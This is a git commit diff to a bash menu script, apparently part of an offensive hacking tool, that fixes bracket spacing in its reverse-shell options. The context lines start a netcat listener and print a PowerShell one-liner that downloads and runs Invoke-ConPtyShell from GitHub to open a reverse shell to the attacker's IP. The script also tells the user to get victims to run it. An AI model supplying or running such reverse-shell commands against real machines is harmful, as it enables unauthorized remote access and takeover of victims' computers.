cfdbddce58975efda8f8e59f1f3140bde3512438
threee3k <152722128+threee3k@users.noreply.github.com>
2023-12-12 07:26:30 -0500

    Update reverseshellattacks.sh

--- maintool/categorys/reverseshellattacks/reverseshellattacks.sh
+++ maintool/categorys/reverseshellattacks/reverseshellattacks.sh
@@ -48,7 +48,7 @@ echo "return to main menu(99)"
 
 
 read SHELLTY
-if [[ $SHELLTY == '1']]
+if [[ $SHELLTY == '1' ]]
 then
     echo "install netcat if you haven't already"
     echo "A netcat server will be started on port 8888, all you have to do is to is to get the target to type this command on their machine, check infect media section to create one"
@@ -57,7 +57,7 @@ then
     sudo nc -l 8888
 fi
 
-if [[ $SHELLTY == '2']]
+if [[ $SHELLTY == '2' ]]
 then
     echo "This will open a netcat server on port 8888, all you have to do is to execute this command on the target's machine, check infect media section"
     echo " IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShe11/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell *YOURIPADRESS* 8888"
@@ -70,10 +70,11 @@ fi
 
 
 
-if [[ $SHELLTY == '99']]
+if [[ $SHELLTY == '99' ]]
 then
     cd .. 
     cd ..
     clear 
     ./skt.sh
     bash skt.sh
+fi
